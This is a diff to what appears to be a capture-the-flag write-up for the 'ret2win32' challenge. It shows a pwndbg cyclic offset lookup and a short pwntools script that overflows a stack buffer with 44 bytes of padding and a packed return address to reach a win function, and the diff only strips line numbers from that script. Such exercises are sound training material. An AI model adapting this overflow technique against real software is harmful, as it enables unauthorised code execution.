@@ -64,25 +64,23 @@ EIP  0x6161616c ('laaa')
 
 pwndbg> cyclic -l 'laaa'
 44
-
-...
 ```
 
 Final exploit:
 ```python
-  1 #!/usr/bin/python3
-  2 
-  3 import struct
-  4 from pwn import *
-  5 
-  6 ret2win_addr = 0x08048659
-  7 
-  8 shellcode = ("A"*44).encode()
-  9 shellcode += struct.pack("<I", ret2win_addr)
- 10 
- 11 p = process('./ret2win32')
- 12 
- 13 p.recvuntil('>')
- 14 p.sendline(shellcode)
- 15 print(p.recvall())
+#!/usr/bin/python3
+ 
+import struct
+from pwn import *
+ 
+ret2win_addr = 0x08048659
+ 
+shellcode = ("A"*44).encode()
+shellcode += struct.pack("<I", ret2win_addr)
+ 
+p = process('./ret2win32')
+
+p.recvuntil('>')
+p.sendline(shellcode)
+print(p.recvall())
 ```
